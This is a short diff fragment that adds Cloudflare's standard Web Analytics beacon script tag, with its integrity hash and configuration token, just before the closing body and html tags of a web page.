+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"14709554ad7c408bb72d311e6e9151c3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
